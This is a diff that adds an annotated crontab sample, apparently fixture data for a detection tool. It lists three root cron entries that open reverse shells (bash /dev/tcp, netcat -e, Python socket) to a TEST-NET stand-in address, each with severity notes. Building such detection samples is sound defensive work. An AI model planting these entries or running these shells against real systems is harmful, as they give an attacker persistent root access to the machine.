@@ -1,0 +1,23 @@
+# ============================================================
+# POC: Reverse shell via cron — harmless sample
+# IP/port are from TEST-NET (RFC 5737) — guaranteed unreachable.
+# ============================================================
+
+# --- Technique: Bash reverse shell over TCP ---
+# Severity: HIGH
+# Bash's built-in /dev/tcp pseudo-device opens a TCP socket.
+# The shell's stdin/stdout are redirected to the attacker's IP:port.
+# 192.0.2.x is TEST-NET — routable nowhere, safe for demos.
+* * * * * root bash -i >& /dev/tcp/192.0.2.1/4444 0>&1
+
+# --- Technique: Netcat with execute flag (-e) ---
+# Severity: HIGH
+# nc -e spawns a shell and connects its I/O to the remote address.
+# -e flag is the classic "netcat backdoor" flag.
+@reboot root nc -e /bin/sh 192.0.2.1 9001
+
+# --- Technique: Python reverse shell ---
+# Severity: HIGH
+# Python one-liner that opens a socket and exec()s a shell.
+# Detected by the pattern: python -c 'import socket'
+*/15 * * * * root python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("192.0.2.1",4444)); os.dup2(s.fileno(),0); subprocess.call(["/bin/sh"])'
